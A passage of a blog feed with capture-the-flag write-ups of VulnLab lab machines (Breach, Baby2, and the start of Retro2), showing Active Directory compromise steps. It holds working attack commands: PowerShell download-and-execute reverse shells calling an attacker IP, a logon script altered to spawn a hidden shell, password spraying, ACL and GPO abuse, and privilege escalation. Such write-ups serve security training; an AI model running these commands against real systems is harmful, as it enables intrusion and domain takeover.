plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br></pre></td></tr></table></figure><ol start="4"><li>We used the Silver Ticket to connect to MSSQL as administrator:</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-mssqlclient -k breachdc.breach.vl</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enable_xp_cmdshell</span><br></pre></td></tr></table></figure><h3 id="Getting-a-Reverse-Shell"><a href="#Getting-a-Reverse-Shell" class="headerlink" title="Getting a Reverse Shell"></a>Getting a Reverse Shell</h3><p>Our initial attempt to get a reverse shell was flagged as malicious:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC xp_cmdshell &#x27;powershell -ep bypass -nop -w hidden -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;&#x27;http://10.8.5.195:8080/Invoke-ConPtyShell.ps1&#x27;&#x27;); Invoke-ConPtyShell 10.8.5.195 3001&quot;&#x27;;</span><br></pre></td></tr></table></figure><p>We found an alternative payload that worked:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC xp_cmdshell &#x27;powershell -ep bypass -nop -w hidden -c &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;&#x27;http://10.8.5.195:8080/maybe.ps1&#x27;&#x27;)&quot;&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/images/Breach/shell.png" alt="Initial Shell"></p><h2 id="Privilege-Escalation-to-SYSTEM"><a href="#Privilege-Escalation-to-SYSTEM" class="headerlink" title="Privilege Escalation to SYSTEM"></a>Privilege Escalation to SYSTEM</h2><p><img src="/images/Breach/impersonate.png" alt="Impersonation Privileges"><br>Since we had impersonation privileges, we used GodPotato to escalate to SYSTEM: <a href="https://github.com/BeichenDream/GodPotato/releases/tag/V1.20">https://github.com/BeichenDream/GodPotato/releases/tag/V1.20</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./God.exe -cmd &quot;C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -NoProfile -Command  IEX (New-Object Net.WebClient).DownloadString(&#x27;http://10.8.5.195:8080/maybe.ps1&#x27;)&quot;</span><br></pre></td></tr></table></figure><p>We modified our maybe.ps1 script and set up a listener:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure><p><img src="/images/Breach/admin.png" alt="Admin Shell"></p><p><a href="https://api.vulnlab.com/api/v1/share?id=c3140301-21e1-4913-99b2-b635726c0e21">https://api.vulnlab.com/api/v1/share?id=c3140301-21e1-4913-99b2-b635726c0e21</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VulnLab </tag>
            
            <tag> Hack The Box </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VL-Baby2</title>
      <link href="/2025/03/15/VL-Baby2/"/>
      <url>/2025/03/15/VL-Baby2/</url>
      
        <content type="html"><![CDATA[<h1 id="Vulnlab-Hack-The-Box-Baby2-Active-Directory-Exploitation-Through-Weak-Credentials-and-Group-Policy-Object-Abuse"><a href="#Vulnlab-Hack-The-Box-Baby2-Active-Directory-Exploitation-Through-Weak-Credentials-and-Group-Policy-Object-Abuse" class="headerlink" title="Vulnlab - Hack The Box Baby2: Active Directory Exploitation Through Weak Credentials and Group Policy Object Abuse"></a>Vulnlab - Hack The Box Baby2: Active Directory Exploitation Through Weak Credentials and Group Policy Object Abuse</h1><p>In this comprehensive VulnLab - Hack The Box walkthrough, I’ll demonstrate how to penetrate the “Baby2” domain environment by exploiting a series of vulnerabilities leading to complete domain compromise. Starting with anonymous SMB access and weak password policies, we’ll progress through login script manipulation for initial access, lateral movement via domain user enumeration, and ultimately achieve domain administrator privileges through WriteDacl abuse and Group Policy Object exploitation. This penetration test showcases several real-world Active Directory attack vectors including guest account enumeration, password spraying attacks, VBS script injection, domain privilege escalation through ACL manipulation, and GPO abuse for administrative access. The techniques demonstrated highlight common security misconfigurations in Windows environments that penetration testers should look for during enterprise assessments.</p><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-14 23:10:17Z)</span><br><span class="line">135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">445/tcp  open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp  open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">|_ssl-date: 2025-03-14T23:11:42+00:00; -2h00m00s from scanner time.</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: BABY2</span><br><span class="line">|   NetBIOS_Domain_Name: BABY2</span><br><span class="line">|   NetBIOS_Computer_Name: DC</span><br><span class="line">|   DNS_Domain_Name: baby2.vl</span><br><span class="line">|   DNS_Computer_Name: dc.baby2.vl</span><br><span class="line">|   DNS_Tree_Name: baby2.vl</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">|_  System_Time: 2025-03-14T23:11:01+00:00</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: -2h00m00s, deviation: 0s, median: -2h00m00s</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2025-03-14T23:11:04</span><br><span class="line">|_  start_date: N/A</span><br></pre></td></tr></table></figure><h2 id="User"><a href="#User" class="headerlink" title="User"></a>User</h2><h3 id="Shares"><a href="#Shares" class="headerlink" title="Shares"></a>Shares</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.89.250 -u &#x27;guest&#x27; -p &#x27;&#x27; --shares</span><br></pre></td></tr></table></figure><p><img src="/images/Baby2/shares-acess.png" alt="shares-acess"></p><h4 id="NETLOGON"><a href="#NETLOGON" class="headerlink" title="NETLOGON"></a>NETLOGON</h4><p>Looking into the <code>Netlogon</code> share we find a <code>login.vbs</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient  //10.10.89.250/NETLOGON -U &#x27;guest&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Baby2/netlogon.png" alt="netlogon"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">Sub MapNetworkShare(sharePath, driveLetter)</span><br><span class="line">    Dim objNetwork</span><br><span class="line">    Set objNetwork = CreateObject(&quot;WScript.Network&quot;)    </span><br><span class="line">  </span><br><span class="line">    &#x27; Check if the drive is already mapped</span><br><span class="line">    Dim mappedDrives</span><br><span class="line">    Set mappedDrives = objNetwork.EnumNetworkDrives</span><br><span class="line">    Dim isMapped</span><br><span class="line">    isMapped = False</span><br><span class="line">    For i = 0 To mappedDrives.Count - 1 Step 2</span><br><span class="line">        If UCase(mappedDrives.Item(i)) = UCase(driveLetter &amp; &quot;:&quot;) Then</span><br><span class="line">            isMapped = True</span><br><span class="line">            Exit For</span><br><span class="line">        End If</span><br><span class="line">    Next</span><br><span class="line">    </span><br><span class="line">    If isMapped Then</span><br><span class="line">        objNetwork.RemoveNetworkDrive driveLetter &amp; &quot;:&quot;, True, True</span><br><span class="line">    End If</span><br><span class="line">    </span><br><span class="line">    objNetwork.MapNetworkDrive driveLetter &amp; &quot;:&quot;, sharePath</span><br><span class="line">    </span><br><span class="line">    If Err.Number = 0 Then</span><br><span class="line">        WScript.Echo &quot;Mapped &quot; &amp; driveLetter &amp; &quot;: to &quot; &amp; sharePath</span><br><span class="line">    Else</span><br><span class="line">        WScript.Echo &quot;Failed to map &quot; &amp; driveLetter &amp; &quot;: &quot; &amp; Err.Description</span><br><span class="line">    End If</span><br><span class="line">    </span><br><span class="line">    Set objNetwork = Nothing</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">MapNetworkShare &quot;\\dc.baby2.vl\apps&quot;, &quot;V&quot;</span><br><span class="line">MapNetworkShare &quot;\\dc.baby2.vl\docs&quot;, &quot;L&quot;</span><br></pre></td></tr></table></figure><h4 id="Apps"><a href="#Apps" class="headerlink" title="Apps"></a>Apps</h4><p>On the <code>Apps</code> share we find a changelog and a .lnk file pointing into the <code>/SYSVOL/scripts/ login.vbs</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient  //10.10.89.250/apps -U &#x27;guest&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Baby2/apps-share.png" alt="apps-share"></p><p>CHANGELOG:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[0.2]</span><br><span class="line"></span><br><span class="line">- Added automated drive mapping</span><br><span class="line"></span><br><span class="line">[0.1]</span><br><span class="line"></span><br><span class="line">- Rolled out initial version of the domain logon script      </span><br></pre></td></tr></table></figure><h4 id="Home"><a href="#Home" class="headerlink" title="Home"></a>Home</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.89.250/homes -U &#x27;guest&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Baby2/home-share.png" alt="home-share"><br>Possible Usernames:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Amelia.Griffiths</span><br><span class="line">Carl.Moore</span><br><span class="line">Harry.Shaw</span><br><span class="line">Joan.Jennings</span><br><span class="line">Joel.Hurst</span><br><span class="line">Kieran.Mitchell</span><br><span class="line">library</span><br><span class="line">Lynda.Bailey</span><br><span class="line">Mohammed.Harris</span><br><span class="line">Nicola.Lamb</span><br><span class="line">Ryan.Jenkins</span><br></pre></td></tr></table></figure><p>Also we can find all of the usernames using <code>lookupsid</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-lookupsid guest@10.10.89.250 -no-pass</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1000: BABY2\DC$ (SidTypeUser)</span><br><span class="line">1101: BABY2\DnsAdmins (SidTypeAlias)</span><br><span class="line">1102: BABY2\DnsUpdateProxy (SidTypeGroup)</span><br><span class="line">1103: BABY2\gpoadm (SidTypeUser)</span><br><span class="line">1104: BABY2\office (SidTypeGroup)</span><br><span class="line">1105: BABY2\Joan.Jennings (SidTypeUser)</span><br><span class="line">1106: BABY2\Mohammed.Harris (SidTypeUser)</span><br><span class="line">1107: BABY2\Harry.Shaw (SidTypeUser)</span><br><span class="line">1108: BABY2\Carl.Moore (SidTypeUser)</span><br><span class="line">1109: BABY2\Ryan.Jenkins (SidTypeUser)</span><br><span class="line">1110: BABY2\Kieran.Mitchell (SidTypeUser)</span><br><span class="line">1111: BABY2\Nicola.Lamb (SidTypeUser)</span><br><span class="line">1112: BABY2\Lynda.Bailey (SidTypeUser)</span><br><span class="line">1113: BABY2\Joel.Hurst (SidTypeUser)</span><br><span class="line">1114: BABY2\Amelia.Griffiths (SidTypeUser)</span><br><span class="line">1602: BABY2\library (SidTypeUser)</span><br><span class="line">2601: BABY2\legacy (SidTypeGroup)</span><br></pre></td></tr></table></figure><h3 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h3><p>After some password spraying we can see that the user <code>library</code> and <code>Carl.Moore</code> have the same password as their usernames and now we get more access to the shares</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.109.97 -u usernames.txt  -p usernames.txt --no-bruteforce --continue-on-success</span><br></pre></td></tr></table></figure><p><img src="/images/Baby2/smb-users-access.png" alt="smb-users-access"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.109.97 -u &quot;Carl.Moore&quot; -p &quot;Carl.Moore&quot; --shares</span><br></pre></td></tr></table></figure><p><img src="/images/Baby2/carl.more-shares.png" alt="carl.more-shares"><br>We got <code>Read</code> on <code>SYSVOL</code> also now we can <code>READ</code> and <code>WRITE</code> on home, docs, and app share!</p><h4 id="Bloodhound"><a href="#Bloodhound" class="headerlink" title="Bloodhound"></a>Bloodhound</h4><p>Also now we have ldap access so we will run <code>bloodhound-python</code> or <code>netexec</code> to get a view of the domain.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap 10.10.89.250 -u &#x27;library&#x27; -p &#x27;library&#x27;  --bloodhound --dns-server 10.10.89.250 -c All --dns-tcp</span><br></pre></td></tr></table></figure><p><img src="/images/Baby2/possible-path.png" alt="possible-path"></p><h4 id="LOGIN-VBS"><a href="#LOGIN-VBS" class="headerlink" title="LOGIN.VBS"></a>LOGIN.VBS</h4><p>We will be changing the login.vbs script to the one below so we can get a shell:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.109.97/SYSVOL -U &#x27;Carl.Moore&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get login.vbs</span><br></pre></td></tr></table></figure><p>Now we change the login.vbs to:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set oShell = CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">oShell.Run(&quot;powershell.exe -nop -w hidden -ep bypass -c IEX(IWR http://10.8.5.195:8080/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.8.5.195 3001&quot;)</span><br></pre></td></tr></table></figure><p><strong>Here is the ps1 shell I use:</strong> <a href="https://github.com/antonioCoco/ConPtyShell">https://github.com/antonioCoco/ConPtyShell</a></p><p>And start our listener and wait for someone to login</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stty raw -echo; (stty size; cat) | nc -lvnp 3001</span><br></pre></td></tr></table></figure><h2 id="ROOT"><a href="#ROOT" class="headerlink" title="ROOT"></a>ROOT</h2><h3 id="Shell-as-Amelia-Griffiths"><a href="#Shell-as-Amelia-Griffiths" class="headerlink" title="Shell as Amelia.Griffiths"></a>Shell as Amelia.Griffiths</h3><p><img src="/images/Baby2/shell-amelina.png" alt="shell-amelina"></p><p>We noticed that Amelia was part of the legacy group. Earlier we identified that the legacy group has <code>WriteDacl</code> over the <code>GPOADM</code> user. Following the bloodhound walkthrough, first we give the legacy group <code>GenericAll</code> permission over <code>GPOADM</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Add-DomainObjectAcl -TargetIdentity &quot;GPOADM&quot; -PrincipalIdentity legacy -Domain baby2.vl -Rights All -Verbose</span><br></pre></td></tr></table></figure><p><img src="/images/Baby2/genericall.png" alt="genericall"><br>Now that we have <code>GenericAll</code> we changed the password of the <code>GPOADM</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$UserPassword = ConvertTo-SecureString &#x27;Password123!&#x27; -AsPlainText -Force</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-DomainUserPassword -Identity &quot;GPOADM&quot; -AccountPassword $UserPassword</span><br></pre></td></tr></table></figure><h3 id="GPO-Abuse"><a href="#GPO-Abuse" class="headerlink" title="GPO Abuse"></a>GPO Abuse</h3><p>As we saw earlier, <code>GPOADM</code> has <code>GenericAll</code> over the <code>Default Domain Policy</code> so we will use a tool named <code>pyGPOAbuse</code> to help us exploit it. <a href="https://github.com/Hackndo/pyGPOAbuse">https://github.com/Hackndo/pyGPOAbuse</a></p><p>We grab the GPO-ID and then we will run the python file that creates a user.<br><img src="/images/Baby2/gpo-id.png" alt="gpo-id"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 pygpoabuse.py &#x27;baby2.vl/gpoadm:Password123!&#x27; -gpo-id &#x27;6AC1786C-016F-11D2-945F-00C04FB984F9&#x27; -f</span><br></pre></td></tr></table></figure><p>After running the command we need to <code>gpupdate</code> so the changes get applied</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpupdate /force</span><br></pre></td></tr></table></figure><p>And we will see a new user that we created <code>john:H4x00r123..</code> in the local administrators group:<br><img src="/images/Baby2/john-user.png" alt="john-user"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.109.97 -u &#x27;john&#x27; -p &#x27;H4x00r123..&#x27;</span><br></pre></td></tr></table></figure><p><a href="https://api.vulnlab.com/api/v1/share?id=762ae368-a3d3-42da-810c-4f17964e01fb" title="https:&#x2F;&#x2F;api.vulnlab.com&#x2F;api&#x2F;v1&#x2F;share?id&#x3D;762ae368-a3d3-42da-810c-4f17964e01fb">https://api.vulnlab.com/api/v1/share?id=762ae368-a3d3-42da-810c-4f17964e01fb</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VulnLab </tag>
            
            <tag> Hack The Box </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VL-Retro2</title>
      <link href="/2025/03/14/VL-Retro2/"/>
      <url>/2025/03/14/VL-Retro2/</url>
      
        <content type="html"><![CDATA[<h1 id="Vulnlab-Hack-The-Box-Retro2-Legacy-Windows-Server-2008-R2-Exploitation-Through-Database-Credential-Extraction-and-Machine-Account-Abuse"><a href="#Vulnlab-Hack-The-Box-Retro2-Legacy-Windows-Server-2008-R2-Exploitation-Through-Database-Credential-Extraction-and-Machine-Account-Abuse" class="headerlink" title="Vulnlab - Hack The Box Retro2: Legacy Windows Server 2008 R2 Exploitation Through Database Credential Extraction and Machine Account Abuse"></a>Vulnlab - Hack The Box Retro2: Legacy Windows Server 2008 R2 Exploitation Through Database Credential Extraction and Machine Account Abuse</h1><p>In this comprehensive VulnLab - Hack The Box  walkthrough, I’ll demonstrate how to penetrate the “Retro2” domain environment by exploiting a series of vulnerabilities leading to complete domain compromise. Starting with anonymous SMB access and password-protected Access database cracking, we’ll progress through LDAP enumeration, machine account password manipulation, and ultimately achieve SYSTEM-level access via Windows Registry RPC endpoint mapper privilege escalation. This penetration test showcases several real-world Active Directory attack vectors including guest account enumeration, database credential extraction, machine account exploitation, GenericWrite abuse for password resets, group membership manipulation, and leveraging legacy Windows vulnerabilities for local privilege escalation. The techniques demonstrated highlight common security misconfigurations in older Windows environments that penetration testers should look for during enterprise assessments.</p><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE      REASON          VERSION</span><br><span class="line">53/tcp    open  domain       syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15F75) (Windows Server 2008 R2 SP1)</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: Microsoft DNS 6.1.7601 (1DB15F75)</span><br><span class="line">88/tcp    open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos </span><br><span class="line">135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds syn-ack ttl 127 Windows Server 2008 R2 Datacenter 7601 Service Pack 1 microsoft-ds (workgroup: RETRO2)</span><br><span class="line">464/tcp   open  kpasswd5?    syn-ack ttl 127</span><br><span class="line">593/tcp   open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped   syn-ack ttl 127</span><br><span class="line">3268/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped   syn-ack ttl 127</span><br><span class="line">49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49157/tcp open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49158/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2025-03-11T18:29:27</span><br><span class="line">|_  start_date: 2025-03-11T18:27:35</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2:1:0: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| p2p-conficker: </span><br><span class="line">|   Checking for Conficker.C or higher...</span><br><span class="line">|   Check 1 (port 22122/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 2 (port 47750/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 3 (port 39335/udp): CLEAN (Timeout)</span><br><span class="line">|   Check 4 (port 23565/udp): CLEAN (Timeout)</span><br><span class="line">|_  0/4 checks are positive: Host is CLEAN or ports are blocked</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: required</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (Windows Server 2008 R2 Datacenter 6.1)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1</span><br><span class="line">|   Computer name: BLN01</span><br><span class="line">|   NetBIOS computer name: BLN01\x00</span><br><span class="line">|   Domain name: retro2.vl</span><br><span class="line">|   Forest name: retro2.vl</span><br><span class="line">|   FQDN: BLN01.retro2.vl</span><br><span class="line">|_  System time: 2025-03-11T19:29:28+01:00</span><br><span class="line">|_clock-skew: mean: -2h19m57s, deviation: 34m36s, median: -1h59m59s</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Windows Server 2008 R2 Datacenter 7601 Service Pack 1 microsoft-ds (workgroup: RETRO2)</p><h2 id="Fast-exploit"><a href="#Fast-exploit" class="headerlink" title="Fast exploit"></a>Fast exploit</h2><p>We can see that its Windows Server 2008 R2 trying the most basic exploits for this version we see that its vulnerable to <code>nopac</code> and <code>zerologon</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc smb BLN01.retro2.vl -M zerologon</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc smb BLN01.retro2.vl -u &quot;user&quot; -p &quot;pass&quot; -M nopac</span><br></pre></td></tr></table></figure><p>There are plenty tutorials for how to use <code>zerologon</code> and the <code>nopac</code> exploits this blog post will focus on the “intended way”</p><h2 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.100.199 -u &#x27;guest&#x27; -p &#x27;&#x27; --shares</span><br></pre></td></tr></table></figure><p><img src="/images/Retro2/guest0smb2.png" alt="guest0smb2"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.100.199/Public -U &#x27;guest&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Retro2/public-shares.png" alt="public-shares"><br>There is one file in the DB folder named <code>staff.accdb</code> we will download that file to our system</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get staff.accdb</span><br></pre></td></tr></table></figure><p>The <code>.accdb</code> is a is an <em>Access 2007&#x2F;2010 Database file</em> used in and opened by Access 2007+, we can use office2john to get the hash and crack it as its password protected</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">office2john staff.accdb</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --format=office --wordlist=/usr/share/wordlists/rockyou.txt 